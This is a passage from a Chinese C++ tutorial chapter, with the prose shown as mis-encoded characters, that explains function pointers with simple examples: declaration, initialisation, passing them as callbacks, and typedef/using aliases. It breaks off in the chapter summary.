class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å£°æ˜ä¸€ä¸ªåä¸º func_ptr çš„å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">// å®ƒæŒ‡å‘ä¸€ä¸ªæ¥å—ä¸¤ä¸ª int å‚æ•°å¹¶è¿”å› int çš„å‡½æ•°</span></span><br><span class="line"><span class="keyword">int</span> (*func_ptr)(<span class="keyword">int</span>, <span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜ä¸€ä¸ªåä¸º process çš„å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">// å®ƒæŒ‡å‘ä¸€ä¸ªæ¥å— const char* å‚æ•°ä¸”æ— è¿”å›å€¼ (void) çš„å‡½æ•°</span></span><br><span class="line"><span class="keyword">void</span> (*process)(<span class="keyword">const</span> <span class="keyword">char</span>*);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜ä¸€ä¸ªåä¸º compare çš„å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">// å®ƒæŒ‡å‘ä¸€ä¸ªæ¥å—ä¸¤ä¸ª double å‚æ•°å¹¶è¿”å› bool çš„å‡½æ•°</span></span><br><span class="line"><span class="keyword">bool</span> (*compare)(<span class="keyword">double</span>, <span class="keyword">double</span>);</span><br></pre></td></tr></table></figure><p><strong>åˆå§‹åŒ–å‡½æ•°æŒ‡é’ˆ:</strong></p><p>å¯ä»¥å°†å‡½æ•°çš„åç§°ï¼ˆä¸å¸¦æ‹¬å·ï¼‰ç›´æ¥èµ‹ç»™å…·æœ‰åŒ¹é…ç­¾åçš„å‡½æ•°æŒ‡é’ˆã€‚å‡½æ•°åæœ¬èº«å°±ä»£è¡¨äº†å‡½æ•°çš„åœ°å€ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ– func_ptr æŒ‡å‘ add å‡½æ•°</span></span><br><span class="line">func_ptr = add; <span class="comment">// æˆ–è€… func_ptr = &amp;add; (&amp; æ˜¯å¯é€‰çš„)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆå§‹åŒ– process æŒ‡å‘ print_message å‡½æ•°</span></span><br><span class="line">process = print_message;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°:</strong></p><p>å¯ä»¥é€šè¿‡å‡½æ•°æŒ‡é’ˆæ¥è°ƒç”¨å®ƒæ‰€æŒ‡å‘çš„å‡½æ•°ï¼Œè¯­æ³•ä¸ç›´æ¥è°ƒç”¨å‡½æ•°ç±»ä¼¼ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> result = func_ptr(<span class="number">5</span>, <span class="number">3</span>); <span class="comment">// è°ƒç”¨ add(5, 3)ï¼Œresult å°†æ˜¯ 8</span></span><br><span class="line">process(<span class="string">&quot;Hello via pointer!&quot;</span>); <span class="comment">// è°ƒç”¨ print_message(&quot;Hello via pointer!&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¹Ÿå¯ä»¥ä½¿ç”¨æ˜¾å¼è§£å¼•ç”¨è¯­æ³• (è¾ƒå°‘è§)</span></span><br><span class="line"><span class="comment">// int result = (*func_ptr)(5, 3);</span></span><br><span class="line"><span class="comment">// (*process)(&quot;Hello via pointer!&quot;);</span></span><br></pre></td></tr></table></figure><h3 id="7-10-2-å‡½æ•°æŒ‡é’ˆç¤ºä¾‹"><a href="#7-10-2-å‡½æ•°æŒ‡é’ˆç¤ºä¾‹" class="headerlink" title="7.10.2 å‡½æ•°æŒ‡é’ˆç¤ºä¾‹"></a>7.10.2 å‡½æ•°æŒ‡é’ˆç¤ºä¾‹</h3><p>ä¸‹é¢æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç¤ºä¾‹ï¼Œæ¼”ç¤ºå¦‚ä½•å£°æ˜ã€åˆå§‹åŒ–å’Œä½¿ç”¨å‡½æ•°æŒ‡é’ˆã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›®æ ‡å‡½æ•° 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›®æ ‡å‡½æ•° 2</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">subtract</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x - y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç›®æ ‡å‡½æ•° 3</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display_result</span><span class="params">(<span class="keyword">int</span> result)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The result is: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å£°æ˜ä¸€ä¸ªæŒ‡å‘æ¥å—ä¸¤ä¸ª int å¹¶è¿”å› int çš„å‡½æ•°çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">int</span> (*operation)(<span class="keyword">int</span>, <span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å£°æ˜ä¸€ä¸ªæŒ‡å‘æ¥å—ä¸€ä¸ª int ä¸”æ— è¿”å›å€¼çš„å‡½æ•°çš„æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">void</span> (*show)(<span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† operation æŒ‡å‘ add å‡½æ•°</span></span><br><span class="line">    operation = add;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Using &#x27;add&#x27; function via pointer:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = operation(<span class="number">10</span>, <span class="number">5</span>); <span class="comment">// è°ƒç”¨ add(10, 5)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 + 5 = &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 15</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† operation æŒ‡å‘ subtract å‡½æ•°</span></span><br><span class="line">    operation = subtract;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nUsing &#x27;subtract&#x27; function via pointer:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> diff = operation(<span class="number">10</span>, <span class="number">5</span>); <span class="comment">// è°ƒç”¨ subtract(10, 5)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;10 - 5 = &quot;</span> &lt;&lt; diff &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† show æŒ‡å‘ display_result å‡½æ•°</span></span><br><span class="line">    show = display_result;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nDisplaying difference using &#x27;show&#x27; pointer:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    show(diff); <span class="comment">// è°ƒç”¨ display_result(diff)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-10-3-æ·±å…¥æ¢è®¨å‡½æ•°æŒ‡é’ˆ"><a href="#7-10-3-æ·±å…¥æ¢è®¨å‡½æ•°æŒ‡é’ˆ" class="headerlink" title="7.10.3 æ·±å…¥æ¢è®¨å‡½æ•°æŒ‡é’ˆ"></a>7.10.3 æ·±å…¥æ¢è®¨å‡½æ•°æŒ‡é’ˆ</h3><p><strong>å‡½æ•°æŒ‡é’ˆä½œä¸ºå‡½æ•°å‚æ•°:</strong></p><p>ä¸€ä¸ªå¸¸è§çš„ç”¨é€”æ˜¯å°†å‡½æ•°æŒ‡é’ˆä½œä¸ºå‚æ•°ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°ã€‚è¿™å…è®¸è°ƒç”¨å‡½æ•°æ ¹æ®ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆæ¥å®šåˆ¶å…¶è¡Œä¸ºã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šæ£€æŸ¥ä¸€ä¸ªæ•°å­—æ˜¯å¦ä¸ºå¶æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_even</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n % <span class="number">2</span> == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šæ£€æŸ¥ä¸€ä¸ªæ•°å­—æ˜¯å¦ä¸ºæ­£æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_positive</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šæ‰“å°æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„æ•°å­—</span></span><br><span class="line"><span class="comment">// å‚æ•°ï¼šä¸€ä¸ªæ•´æ•°å‘é‡ï¼Œä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ (æŒ‡å‘æ£€æŸ¥æ¡ä»¶çš„å‡½æ•°)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_numbers_if</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; numbers, <span class="keyword">bool</span> (*check)(<span class="keyword">int</span>))</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Numbers satisfying the condition: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : numbers) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check(num)) &#123; <span class="comment">// ä½¿ç”¨ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆè°ƒç”¨æ£€æŸ¥å‡½æ•°</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; data = &#123;<span class="number">1</span>, <span class="number">-2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">-5</span>, <span class="number">6</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Checking for even numbers:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    print_numbers_if(data, is_even); <span class="comment">// ä¼ é€’ is_even å‡½æ•°çš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nChecking for positive numbers:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    print_numbers_if(data, is_positive); <span class="comment">// ä¼ é€’ is_positive å‡½æ•°çš„åœ°å€</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Checking for even numbers:</span><br><span class="line">Numbers satisfying the condition: -2 4 6</span><br><span class="line">Checking for positive numbers:</span><br><span class="line">Numbers satisfying the condition: 1 3 4 6</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>print_numbers_if</code> å‡½æ•°çš„è¡Œä¸ºç”±ä¼ é€’ç»™å®ƒçš„ <code>check</code> å‡½æ•°æŒ‡é’ˆå†³å®šã€‚</p><h3 id="7-10-4-ä½¿ç”¨-typedef-æˆ–-using-è¿›è¡Œç®€åŒ–"><a href="#7-10-4-ä½¿ç”¨-typedef-æˆ–-using-è¿›è¡Œç®€åŒ–" class="headerlink" title="7.10.4 ä½¿ç”¨ typedef æˆ– using è¿›è¡Œç®€åŒ–"></a>7.10.4 ä½¿ç”¨ typedef æˆ– using è¿›è¡Œç®€åŒ–</h3><p>å‡½æ•°æŒ‡é’ˆçš„å£°æ˜è¯­æ³•å¯èƒ½æ¯”è¾ƒå†—é•¿å’Œå¤æ‚ã€‚å¯ä»¥ä½¿ç”¨ <code>typedef</code> (ä¼ ç»Ÿæ–¹å¼) æˆ– <code>using</code> (C++11 åŠä»¥åæ¨è) æ¥åˆ›å»ºå‡½æ•°æŒ‡é’ˆç±»å‹çš„åˆ«åï¼Œä½¿ä»£ç æ›´æ¸…æ™°ã€‚</p><p><strong>ä½¿ç”¨ <code>typedef</code>:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ typedef å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹åˆ«å</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">bool</span> <span class="params">(*CheckFunction)</span><span class="params">(<span class="keyword">int</span>)</span></span>; <span class="comment">// CheckFunction æ˜¯æŒ‡å‘ (int) -&gt; bool å‡½æ•°çš„æŒ‡é’ˆç±»å‹</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*DisplayFunction)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_if</span><span class="params">(<span class="keyword">int</span> val, CheckFunction check, DisplayFunction display)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (check(val)) &#123;</span><br><span class="line">        display(<span class="string">&quot;Condition met!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        display(<span class="string">&quot;Condition not met.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_negative</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; <span class="keyword">return</span> n &lt; <span class="number">0</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    CheckFunction checker = is_negative; <span class="comment">// ä½¿ç”¨åˆ«åå£°æ˜å’Œåˆå§‹åŒ–</span></span><br><span class="line">    DisplayFunction printer = show_message;</span><br><span class="line"></span><br><span class="line">    print_if(<span class="number">-5</span>, checker, printer); <span class="comment">// è¾“å‡º: Condition met!</span></span><br><span class="line">    print_if(<span class="number">10</span>, checker, printer); <span class="comment">// è¾“å‡º: Condition not met.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ <code>using</code> (C++11):</strong></p><p><code>using</code> æä¾›äº†æ›´ç›´è§‚ã€æ›´ä¸€è‡´çš„åˆ«åè¯­æ³•ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨ using å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹åˆ«å (æ¨è)</span></span><br><span class="line"><span class="keyword">using</span> CheckFunction = <span class="keyword">bool</span> (*)(<span class="keyword">int</span>); <span class="comment">// æŒ‡å‘ (int) -&gt; bool å‡½æ•°çš„æŒ‡é’ˆç±»å‹</span></span><br><span class="line"><span class="keyword">using</span> DisplayFunction = <span class="keyword">void</span> (*)(<span class="keyword">const</span> <span class="keyword">char</span>*);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (å‡½æ•° print_if, is_negative, show_message å’Œ main å‡½æ•°åŒä¸Š) ...</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_if</span><span class="params">(<span class="keyword">int</span> val, CheckFunction check, DisplayFunction display)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (check(val)) &#123;</span><br><span class="line">        display(<span class="string">&quot;Condition met!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        display(<span class="string">&quot;Condition not met.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_negative</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123; <span class="keyword">return</span> n &lt; <span class="number">0</span>; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_message</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; msg &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    CheckFunction checker = is_negative;</span><br><span class="line">    DisplayFunction printer = show_message;</span><br><span class="line"></span><br><span class="line">    print_if(<span class="number">-5</span>, checker, printer);</span><br><span class="line">    print_if(<span class="number">10</span>, checker, printer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç±»å‹åˆ«åå¯ä»¥æ˜¾è‘—æé«˜æ¶‰åŠå‡½æ•°æŒ‡é’ˆçš„ä»£ç çš„å¯è¯»æ€§ã€‚</p><p><strong>æ€»ç»“:</strong></p><p>å‡½æ•°æŒ‡é’ˆæ˜¯ C++ ä¸­ä¸€ä¸ªå¼ºå¤§çš„ç‰¹æ€§ï¼Œå®ƒå…è®¸å°†å‡½æ•°è§†ä¸ºæ•°æ®è¿›è¡Œä¼ é€’å’Œå­˜å‚¨ã€‚è™½ç„¶è¯­æ³•å¯èƒ½åˆçœ‹èµ·æ¥æœ‰äº›å¤æ‚ï¼Œä½†é€šè¿‡ <code>typedef</code> æˆ– <code>using</code> å¯ä»¥ç®€åŒ–ã€‚ç†è§£å‡½æ•°æŒ‡é’ˆå¯¹äºæŒæ¡å›è°ƒæœºåˆ¶ã€æŸäº›è®¾è®¡æ¨¡å¼ä»¥åŠä¸ C åº“äº¤äº’éå¸¸é‡è¦ã€‚åœ¨ç°ä»£ C++ ä¸­ï¼Œå‡½æ•°å¯¹è±¡ï¼ˆFunctorsï¼‰å’Œ Lambda è¡¨è¾¾å¼ï¼ˆå°†åœ¨åç»­ç« èŠ‚ä»‹ç»ï¼‰æä¾›äº†æ›´çµæ´»ã€æœ‰æ—¶æ›´æ–¹ä¾¿çš„æ›¿ä»£æ–¹æ¡ˆï¼Œä½†å‡½æ•°æŒ‡é’ˆä»ç„¶æœ‰å…¶ç”¨æ­¦ä¹‹åœ°ã€‚</p><h2 id="7-11-æ€»ç»“"><a href="#7-11-æ€»ç»“" class="headerlink" title="7.11 æ€»ç»“"></a>7.11 æ€»ç»“</h2><p>æœ¬ç« æ·±å…¥æ¢è®¨äº†å‡½æ•°è¿™ä¸€ C++ ç¼–ç¨‹çš„åŸºæœ¬æ¨¡å—ï¼Œæ¶µç›–äº†å‡½æ•°å®šä¹‰ã€è°ƒç”¨ã€å‚æ•°ä¼ é€’æœºåˆ¶ä»¥åŠå¦‚ä½•å°†å‡½æ•°ä¸å„ç§æ•°æ®ç±»å‹ï¼ˆæ•°ç»„ã€å­—ç¬¦ä¸²ã€ç»“æ„ã€å¯¹è±¡ï¼‰ç»“åˆä½¿ç”¨ã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p> <strong>å‡½æ•°åŸºç¡€:</strong> å¤ä¹ äº†å‡½æ•°çš„å®šä¹‰ï¼ˆè¿”å›ç±»å‹ã€åç§°ã€å‚æ•°åˆ—è¡¨ã€å‡½æ•°ä½“ï¼‰ã€å‡½æ•°åŸå‹ï¼ˆå£°æ˜å‡½æ•°æ¥å£ä»¥ä¾›ç¼–è¯‘å™¨ä½¿ç”¨ï¼‰å’Œå‡½æ•°è°ƒç”¨ï¼ˆæ‰§è¡Œå‡½æ•°ä»£ç ï¼‰ã€‚</p></li><li><p><strong>å‚æ•°ä¼ é€’:</strong></p><ul><li>  <strong>æŒ‰å€¼ä¼ é€’ (Pass by Value):</strong> C++ çš„é»˜è®¤æ–¹å¼ï¼Œé€‚ç”¨äºåŸºæœ¬ç±»å‹ã€ç»“æ„å’Œç±»å¯¹è±¡ã€‚å‡½æ•°æ“ä½œçš„æ˜¯å®å‚çš„å‰¯æœ¬ï¼Œä¸å½±å“åŸå§‹æ•°æ®ï¼Œä½†å¯èƒ½å› å¤åˆ¶å¤§å‹å¯¹è±¡è€Œæ•ˆç‡ä½ä¸‹ã€‚</li><li>  <strong>æ•°ç»„ä¼ é€’:</strong> C é£æ ¼æ•°ç»„ä¼ é€’æ—¶ä¼šé€€åŒ–ä¸ºæŒ‡å‘é¦–å…ƒç´ çš„æŒ‡é’ˆï¼Œå‡½æ•°ç›´æ¥æ“ä½œåŸå§‹æ•°ç»„ï¼Œæ•ˆç‡é«˜ä½†ä¸¢å¤±å¤§å°ä¿¡æ¯ï¼Œéœ€é¢å¤–ä¼ é€’å¤§å°æˆ–ä½¿ç”¨æŒ‡é’ˆåŒºé—´ã€‚<code>const</code> å¯ç”¨äºä¿æŠ¤æ•°ç»„å†…å®¹ã€‚</li><li>  <strong>äºŒç»´æ•°ç»„ä¼ é€’:</strong> å¿…é¡»åœ¨å‡½æ•°å‚æ•°ä¸­æŒ‡å®šé™¤ç¬¬ä¸€ç»´ä¹‹å¤–çš„æ‰€æœ‰ç»´åº¦çš„å¤§å°ã€‚</li><li>  <strong>ç»“æ„ä¼ é€’:</strong> é»˜è®¤æŒ‰å€¼ä¼ é€’ã€‚ä¸ºæé«˜æ•ˆç‡æˆ–å…è®¸ä¿®æ”¹ï¼Œå¯ä¼ é€’ç»“æ„æŒ‡é’ˆ (<code>struct_type*</code>)ï¼Œä½¿ç”¨ <code>-&gt;</code> è®¿é—®æˆå‘˜ï¼Œæˆ–ä½¿ç”¨å¼•ç”¨ï¼ˆç¬¬ 8 ç« å†…å®¹ï¼‰ã€‚</li><li>  <strong><code>std::string</code> å’Œ <code>std::array</code> å¯¹è±¡ä¼ é€’:</strong> é»˜è®¤æŒ‰å€¼ä¼ é€’ï¼Œä½†é€šå¸¸æ¨è<strong>æŒ‰å¸¸é‡å¼•ç”¨ (<code>const T&amp;</code>)</strong> ä¼ 